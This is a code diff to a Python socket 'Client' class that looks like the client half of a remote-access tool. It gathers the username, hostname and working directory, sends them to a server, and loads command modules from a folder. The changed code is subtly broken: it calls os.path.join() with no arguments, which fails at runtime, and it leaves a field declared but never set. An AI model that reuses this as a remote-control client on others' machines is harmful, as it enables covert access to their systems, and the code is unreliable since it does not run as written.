@@ -1,7 +1,6 @@
 import getpass
 import os
 import socket
-import subprocess
 import sys
 import time
 from contextlib import redirect_stdout
@@ -32,11 +31,14 @@ class Client:
         self.buffer_size: int = 1024 * 128
         self.separator: str = '<||>'
 
-        os.chdir('C:\\')
-
         self.platform_type: str = sys.platform.lower()
         self.username = getpass.getuser()
         self.working_directory = os.getcwd()
+        self.system_drive: str
+
+        self.new_working_directory: str = os.path.join()
+
+        os.chdir('C:\\')
 
         self.socket.send(self.working_directory.encode())
         self.socket.send(socket.gethostname().encode())
@@ -96,6 +98,10 @@ class Client:
     @property
     def get_commands(self):
         return [file[:-3].lower() for file in os.listdir(self.module_folder) if file.endswith('.py')]
+
+    @staticmethod
+    def encode_string(string: str) -> bytes:
+        return string.encode()
 
 
 if __name__ == '__main__':
